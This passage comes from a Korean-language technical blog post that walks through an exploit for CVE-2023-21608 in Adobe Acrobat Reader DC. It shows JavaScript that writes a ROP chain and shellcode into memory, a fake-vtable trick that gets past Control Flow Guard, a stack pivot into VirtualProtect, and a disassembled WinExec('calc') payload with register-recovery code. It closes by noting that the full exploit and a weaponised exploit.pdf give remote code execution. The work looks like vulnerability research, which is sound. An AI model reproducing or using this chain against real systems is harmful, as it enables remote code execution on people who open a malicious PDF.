<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; rop.length; i++) AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">4</span> * i, rop[i]);</code></pre>
<p>&#xC774;&#xD6C4; &#xBCF5;&#xC81C;&#xB41C; vtable&#xC5D0; ROP &#xAC00;&#xC82F; &#xC8FC;&#xC18C;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xACE0; <code>textField</code>&#xC778; <code>f0</code>&#xC758; vtable &#xC8FC;&#xC18C;&#xB97C; Fake vtable&#xB85C; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>f0.defaultValue</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; <code>vtable + 0x48</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>defaultValue</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370; Fake vtable&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC758; <code>sub_20EFAA60</code>&#xC5D0; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs nasm">.text:20EFAA60 sub_20EFAA60    proc near               
.text:20EFAA60                                         
.text:20EFAA60                 mov     eax, [ecx]
.text:20EFAA62                 push    0Dh
.text:20EFAA64                 call    dword ptr [eax+30h]
.text:20EFAA67                 retn
.text:20EFAA67 sub_20EFAA60    endp</code></pre>
<p>Adobe Acrobat Reader DC&#xB294; CFG(Control Flow Guard)&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC5B4; vtable&#xC744; &#xD1B5;&#xD55C; &#xAC00;&#xC0C1; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC774;&#xB098; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD1B5;&#xD55C; &#xD638;&#xCD9C; &#xB4F1;&#xC758; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; <code>__guard_check_icall_fptr</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; <code>ntdll!LdrpValidateUserCallTarget</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC720;&#xD6A8;&#xD55C; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC778;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xAC15;&#xC81C; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; vtable&#xC5D0; &#xC9C1;&#xC811; ROP &#xAC00;&#xC82F;&#xC744; &#xC0BD;&#xC785;&#xD558;&#xBA74; &#xD638;&#xCD9C;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p>&#xD558;&#xC9C0;&#xB9CC; <code>sub_20EFAA60</code>&#xB294; &#xC544;&#xB798;&#xC758; <code>AXTEFontAccess::</code>vftable&#x2019;<code>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xC774;&#xACE0; &#xC720;&#xD6A8;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC758; RVA &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB41C;</code>__guard_fids_table`&#xC5D0;&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p>
<pre><code class="hljs nasm">.rdata:211315C0 ; const AXTEFontAccess::`vftable&apos;
.rdata:211315C0 ??_7AXTEFontAccess@@6B@ dd offset sub_20DFFBE0
.rdata:211315C0                                         ; DATA XREF: sub_20DFF7B6+21&#x2191;o
.rdata:211315C0                                         ; sub_20DFFAAA+6&#x2191;o
                                       ....
.rdata:21131674                 dd offset sub_20EFAA60
                                       ....</code></pre>
<p>&#xB530;&#xB77C;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>ntdll!LdrpValidateUserCallTarget</code>&#xC758; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xACE0; &#xD638;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=63eeaa60 <span class="hljs-attribute">edx</span>=0be950e0 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990
<span class="hljs-attribute">eip</span>=63a89a3b <span class="hljs-attribute">esp</span>=0457c170 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na po nc
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200202
AcroForm!hb_ot_tags_to_script_and_language+0x68f9b:
63a89a3b ff153ca9fc63    call    dword ptr [AcroForm!DllUnregisterServer+0x50e8dc (63fca93c)] ds:002b:63fca93c={ntdll!LdrpValidateUserCallTarget (777c88e0)}
0:000&gt; p
<span class="hljs-attribute">eax</span>=0c7dd54c <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=63eeaa60 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990
<span class="hljs-attribute">eip</span>=63a89a41 <span class="hljs-attribute">esp</span>=0457c170 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247
AcroForm!hb_ot_tags_to_script_and_language+0x68fa1:
63a89a41 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:<span class="hljs-attribute">0457c188</span>=10c7d038
0:000&gt; p
<span class="hljs-attribute">eax</span>=0c7dd54c <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d038 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990
<span class="hljs-attribute">eip</span>=63a89a44 <span class="hljs-attribute">esp</span>=0457c170 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247
AcroForm!hb_ot_tags_to_script_and_language+0x68fa4:
63a89a44 ffd6            call    esi {AcroForm!DllUnregisterServer+0x42ea00 (63eeaa60)}</code></pre>
<p>&#xC774;&#xD6C4; &#xD638;&#xCD9C;&#xB41C; <code>sub_20EFAA60</code>&#xC5D0;&#xC11C; <code>mov eax, [ecx]</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; ecx(<code>this</code>)&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; Fake vtable&#xC758; &#xC8FC;&#xC18C;(0x20000158)&#xAC00; eax&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>call dword ptr [eax + 30h]</code>&#xC5D0; &#xC758;&#xD574; Fake vtable + 0x30&#xC5D0; &#xC800;&#xC7A5;&#xB41C; stack pivot &#xAC00;&#xC82F;&#xC774; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. <code>sub_20EFAA60</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC5D0;&#xC11C;&#xB294; CFG &#xAC80;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ROP &#xAC00;&#xC82F;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; CFG&#xB97C; &#xC6B0;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=0c7dd54c <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d038 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990
<span class="hljs-attribute">eip</span>=63eeaa60 <span class="hljs-attribute">esp</span>=0457c16c <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247
AcroForm!DllUnregisterServer+0x42ea00:
63eeaa60 8b01            mov     eax,dword ptr [ecx]  ds:002b:<span class="hljs-attribute">10c7d038</span>=20000158
0:000&gt; t
<span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d038 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990
<span class="hljs-attribute">eip</span>=63eeaa62 <span class="hljs-attribute">esp</span>=0457c16c <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247
AcroForm!DllUnregisterServer+0x42ea02:
63eeaa62 6a0d            push    0Dh
0:000&gt; t
<span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d038 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990
<span class="hljs-attribute">eip</span>=63eeaa64 <span class="hljs-attribute">esp</span>=0457c168 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247
AcroForm!DllUnregisterServer+0x42ea04:
63eeaa64 ff5030          call    dword ptr [eax+30h]  ds:002b:<span class="hljs-attribute">20000188</span>=63a46984
0:000&gt; u 63a46984
AcroForm!hb_ot_tags_to_script_and_language+0x25ee4:
63a46984 8be0            mov     esp,eax
63a46986 ffc9            dec     ecx
63a46988 c3              ret</code></pre>
<p>&#xAC00;&#xC82F;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; eax(<code>arrBufPtr + 0x100</code>)&#xAC12;&#xC744; esp&#xC5D0; &#xC4F0;&#xBA74;&#xC11C; stack pivot&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACE0; <code>ret</code>&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774;&#xB54C;&#xC758; esp&#xC778; 0x20000158&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC758; &#xB610; &#xB2E4;&#xB978; stack pivot &#xAC00;&#xC82F;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d037 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990
<span class="hljs-attribute">eip</span>=6380e646 <span class="hljs-attribute">esp</span>=2000015c <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na po cy
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200203
AcroForm+0x1e646:
6380e646 5c              pop     esp
0:000&gt; t
<span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d037 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990
<span class="hljs-attribute">eip</span>=6380e647 <span class="hljs-attribute">esp</span>=20000358 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na po cy
<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200203
AcroForm+0x1e647:
6380e647 c3              ret
0:000&gt; dd esp
20000358  757d0760 20000458 20000458 00001000
20000368  00000040 20000598 00000000 00000000</code></pre>
<p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; esp&#xB294; 0x20000358&#xB85C; &#xBC14;&#xB00C;&#xAC8C; &#xB418;&#xACE0; &#xD55C;&#xBC88; &#xB354; <code>ret</code>&#xD558;&#xBA74;&#xC11C; <code>KERNEL32!VirtualProtectStub</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB85C; eip&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xACE0; pivot&#xB41C; &#xC2A4;&#xD0DD;&#xC5D0; &#xAD6C;&#xC131;&#xB41C; &#xC778;&#xC790;&#xB4E4;&#xC5D0; &#xC758;&#xD574; <code>VirtualProtect(0x20000458, 0x1000, PAGE_EXECUTE_READWRITE, 0x20000598)</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xAC19;&#xC740; &#xD6A8;&#xACFC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h2 id="6-Insert-Shellcode"><a href="#6-Insert-Shellcode" class="headerlink" title="6. Insert Shellcode"></a>6. Insert Shellcode</h2><p>&#xC0BD;&#xC785;&#xB41C; ROP &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xC758;&#xD574; &#xD638;&#xCD9C;&#xB41C; <code>VirtualProtect</code>&#xB294; &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB41C; 0x20000458&#xB85C; &#xB9AC;&#xD134;&#xD558;&#xACE0; &#xC774; &#xC8FC;&#xC18C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xC5D0; &#xC758;&#xD574; shellcode&#xAC00; &#xC0BD;&#xC785;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs jsx"><span class="hljs-keyword">var</span> shellcode = [
    <span class="hljs-comment">// recovery prefix       (store reg context)</span>
    <span class="hljs-comment">// 0x909090CC,</span>
    <span class="hljs-number">0x89e083e8</span>, <span class="hljs-number">0x18535256</span>, <span class="hljs-number">0x57505590</span>,

    <span class="hljs-comment">// shellcode</span>
    <span class="hljs-number">835867240</span>, <span class="hljs-number">1667329123</span>, <span class="hljs-number">1415139921</span>, <span class="hljs-number">1686860336</span>, <span class="hljs-number">2339769483</span>, <span class="hljs-number">1980542347</span>, <span class="hljs-number">814448152</span>, <span class="hljs-number">2338274443</span>,
    <span class="hljs-number">1545566347</span>, <span class="hljs-number">1948196865</span>, <span class="hljs-number">4270543903</span>, <span class="hljs-number">605009708</span>, <span class="hljs-number">390218413</span>, <span class="hljs-number">2168194903</span>, <span class="hljs-number">1768834421</span>, <span class="hljs-number">4035671071</span>,
    <span class="hljs-number">469892611</span>, <span class="hljs-number">1018101719</span>, <span class="hljs-number">2425393296</span>,

    <span class="hljs-comment">// recovery suffix</span>
    <span class="hljs-comment">// 0x909090CC,</span>
    <span class="hljs-comment">/*restore regs*/</span> <span class="hljs-number">0x58585d58</span>, <span class="hljs-comment">/*restore vtable*/</span> <span class="hljs-number">0x8b48608b</span>, <span class="hljs-number">0x50648911</span>, <span class="hljs-comment">/*pop regs*/</span> <span class="hljs-number">0x5f5e5a5b</span>,
    <span class="hljs-comment">/*restore ebp,esp: 0x89ea83ea, 0x3089d490, */</span> <span class="hljs-number">0x89ec83ec</span>, <span class="hljs-number">0x30909090</span>, <span class="hljs-comment">/* esi = fn*/</span> <span class="hljs-number">0x8b706890</span>,
    <span class="hljs-comment">/*arrbuf restore*/</span> <span class="hljs-number">0x53bb4000</span>, <span class="hljs-number">0x00208b50</span>, <span class="hljs-number">0x6cc7430c</span>, <span class="hljs-number">0xe8ff0000</span>, <span class="hljs-number">0xc74220e8</span>, <span class="hljs-number">0xff000090</span>,
    <span class="hljs-number">0x8953108b</span>, <span class="hljs-number">0x50708913</span>, <span class="hljs-number">0x8b507489</span>, <span class="hljs-number">0x530431d2</span>, <span class="hljs-number">0x5b909090</span>, <span class="hljs-comment">/*jmp esi*/</span> <span class="hljs-number">0xffe69090</span>
    <span class="hljs-comment">/*jmp defaultVal 0xff606890*/</span>
];

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.length; i++) AAW(arrBufPtr + <span class="hljs-number">0x400</span> + i * <span class="hljs-number">4</span>, re(shellcode[i]));</code></pre>
<p>&#xC0BD;&#xC785;&#xB41C; shellcode&#xB97C; &#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xD55C; &#xACB0;&#xACFC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p>
<pre><code class="hljs nasm">89e0           mov     eax, esp
83e818         sub     eax, 18h
53             push    ebx
52             push    edx
56             push    esi
57             push    edi
50             push    eax
55             push    ebp
90             nop     
31d2           xor     edx, edx
52             push    edx; 0
6863616c63     push    636C6163h; &quot;calc&quot;
54             push    esp
59             pop     ecx
52             push    edx
51             push    ecx
648b7230       mov     esi, dword ptr fs:[edx+30h]; PEB
8b760c         mov     esi, dword ptr [esi+0Ch]; PEB_LDR_DATA
8b760c         mov     esi, dword ptr [esi+0Ch]; InLoadOrderModuleList
ad             lods    dword ptr [esi]; eax &lt;- AcroRd32.exe&apos;s _LDR_DATA_TABLE_ENTRY
8b30           mov     esi, dword ptr [eax]; esi &lt;- KERNEL32.dll&apos;s _LDR_DATA_TABLE_ENTRY
8b7e18         mov     edi, dword ptr [esi+18h]; edi &lt;- KERNEL32 dll base
8b5f3c         mov     ebx, dword ptr [edi+3Ch]; ebx &lt;- PE Headaer Offset
8b5c1f78       mov     ebx, dword ptr [edi+ebx+78h]; ebx &lt;- Export Table Offset
8b741f20       mov     esi, dword ptr [edi+ebx+20h]; esi &lt;- Name Pointer Table offset
01fe           add     esi, edi; add KERNEL32 base to esi(Name Pointer Table addr)
8b541f24       mov     edx, dword ptr [edi+ebx+24h]; edx &lt;- Ordinal Table Offset
0fb72c17       movzx   ebp, word ptr [edi+edx]; ebp &lt;- Ordinal Number
42             inc     edx
42             inc     edx; move to next
ad             lods    dword ptr [esi]; Function name offset
813c0757696e45 cmp     dword ptr [edi+eax], 456E6957h; compare Function_Name with &quot;WinE&quot;
75f0           jne     20000491; if WinExec Found, no jump
8b741f1c       mov     esi, dword ptr [edi+ebx+1Ch]; esi &lt;- Address Table Offset
01fe           add     esi, edi; esi &lt;- Address Table addr
033cae         add     edi, dword ptr [esi+ebp*4]; edi &lt;- edi(KERNEL32 base) + WinExec Offset
ffd7           call    edi; WinExec(&quot;calc&quot;, 0)</code></pre>
<p>&#xC774;&#xB294; <code>WinExec(&quot;calc&quot;, 0)</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; Windows x86 &#xB300;&#xC0C1; Universal Shellcode&#xB85C; &#xACC4;&#xC0B0;&#xAE30; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC99D;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; <code>WinExec</code>&#xAC00; &#xB9AC;&#xD134;&#xD55C; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; shellcode&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; shellcode&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>&#xC758; length, <code>f0</code>&#xC758; vtable &#xC8FC;&#xC18C;,  pivot&#xB41C; &#xC2A4;&#xD0DD; &#xB4F1;&#xC744; &#xBCF5;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC0AC;&#xC804;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xB454; <code>defaultValue</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB85C; <code>jmp</code>&#xD558;&#xC5EC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xC131;&#xACF5;&#xD55C; &#xD6C4;&#xC5D0;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs nasm">200004b0 58             pop     eax
200004b1 58             pop     eax
200004b2 5d             pop     ebp
200004b3 58             pop     eax
200004b4 8b4860         mov     ecx, dword ptr [eax+60h]
200004b7 8b5064         mov     edx, dword ptr [eax+64h]
200004ba 8911           mov     dword ptr [ecx], edx
200004bc 5f             pop     edi
200004bd 5e             pop     esi
200004be 5a             pop     edx
200004bf 5b             pop     ebx
200004c0 89ec           mov     esp, ebp
200004c2 83ec30         sub     esp, 30h
200004c5 90             nop     
200004c6 90             nop     
200004c7 90             nop     
200004c8 8b7068         mov     esi, dword ptr [eax+68h]
200004cb 90             nop     
200004cc 53             push    ebx
200004cd bb40000020     mov     ebx, 20000040h
200004d2 8b506c         mov     edx, dword ptr [eax+6Ch]
200004d5 c7430ce8ff0000 mov     dword ptr [ebx+0Ch], 0FFE8h
200004dc c74220e8ff0000 mov     dword ptr [edx+20h], 0FFE8h
200004e3 90             nop     
200004e4 895310         mov     dword ptr [ebx+10h], edx
200004e7 8b5070         mov     edx, dword ptr [eax+70h]
200004ea 8913           mov     dword ptr [ebx], edx
200004ec 8b5074         mov     edx, dword ptr [eax+74h]
200004ef 895304         mov     dword ptr [ebx+4], edx
200004f2 31d2           xor     edx, edx
200004f4 5b             pop     ebx
200004f5 90             nop     
200004f6 90             nop     
200004f7 90             nop     
200004f8 ffe6           jmp     esi</code></pre>
<p>ROP &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC640; Shellcode&#xC758; &#xC2E4;&#xD589;&#xC740; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>f0</code>&#xC758; Fake vtable&#xC758; <code>defaultValue</code>&#xD568;&#xC218;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; <code>sub_20EFAA60</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD06C;&#xB798;&#xC2DC; &#xB4F1; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBCC0;&#xC870;&#xD55C; <code>targetStr</code>&#xACFC; <code>targetDV</code>&#xB97C; &#xC6D0;&#xB798;&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xBCF5;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs jsx">corruptedTypedArr[arrStart + <span class="hljs-number">6</span>] = originalTargetStrAddr;
<span class="hljs-comment">//corruptedTypedArr[FAKE_DV_START+20] = originalDVBackingStore;</span>
corruptedTypedArr[arrStart + <span class="hljs-number">8</span>] = originalTargetDVAddr;

<span class="hljs-keyword">var</span> x = f0.defaultValue;</code></pre>
<p>&#xC804;&#xCCB4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xB294; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/hacksysteam/CVE-2023-21608">Reference</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0; <code>exploit.pdf</code>&#xC5D0;&#xB294; &#xD574;&#xB2F9; JavaScript &#xCF54;&#xB4DC;&#xAC00; &#xC784;&#xBCA0;&#xB4DC;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Acrobat&#xC774;&#xB098; Acrobat Reader&#xB85C; &#xC5F4; &#xACBD;&#xC6B0; &#xC704; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; RCE&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p>
<p>&#xB4DC;&#xB514;&#xC5B4;!&#x2026; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xC815;&#xB9D0; &#xC27D;&#xC9C0; &#xC54A;&#xB124;&#xC694;&#x2026; &#xC2DC;&#xC5F0; &#xB370;&#xBAA8;&#xAE4C;&#xC9C0;&#xB9CC; &#xBCF4;&#xC5EC;&#xB4DC;&#xB9AC;&#xACE0; &#xB9C8;&#xCE58;&#xB3C4;&#xB85D;&#xD558;&#xC8E0;!</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/f3RObd6h2qw?si=l7WAeyWgGJ_MuCWp" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

